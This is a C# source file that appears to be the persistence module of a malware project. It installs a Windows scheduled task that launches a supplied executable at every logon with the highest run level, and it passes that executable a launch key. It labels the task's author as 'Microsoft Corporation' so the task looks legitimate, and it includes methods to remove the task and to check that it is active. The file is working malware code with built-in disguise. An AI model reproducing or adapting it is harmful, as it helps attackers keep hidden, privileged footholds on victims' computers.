using Microsoft.Win32.TaskScheduler;

namespace Main.Source.Functions.Persistence
{
    public class TaskScheduler
    {
        public static void Install(string name, string path)
        {
            using (var scheduler = new TaskService())
            {
                var task = scheduler.NewTask();

                task.Triggers.Add(new LogonTrigger());
                task.Actions.Add(new ExecAction(
                    path,
                    ConfigMisc.LAUNCH_KEY,
                    null
                ));

                task.RegistrationInfo.Author = "Microsoft Corporation";
                task.Principal.RunLevel = TaskRunLevel.Highest;
                task.Settings.Enabled = true;

                var registered = scheduler.RootFolder.RegisterTaskDefinition(
                    name,
                    task,
                    TaskCreation.CreateOrUpdate,
                    null,
                    null,
                    TaskLogonType.InteractiveToken
                );

                if (registered == null)
                {
                    Utilities.Logger.Error("TaskScheduler.Install: failed to install");
                }
            }
        }

        public static void Uninstall(string name)
        {
            using (var scheduler = new TaskService())
            {
                var task = scheduler.GetTask(name);
                if (task == null)
                {
                    Utilities.Logger.Error($"TaskScheduler.Uninstall: failed to find task");
                    return;
                }

                try
                {
                    scheduler.RootFolder.DeleteTask(name, true);
                }
                catch
                {
                    Utilities.Logger.Error($"TaskScheduler.Uninstall: failed to uninstall");
                }
            }
        }

        public static string Check(string name)
        {
            using (var scheduler = new TaskService())
            {
                var task = scheduler.GetTask(name);
                if (task == null)
                {
                    return "Failed to find file (bad)";
                }

                if (!task.Enabled)
                {
                    return "File is not allowed to auto start (bad)";
                }

                return "All is good (good)";
            }
        }
    }
}
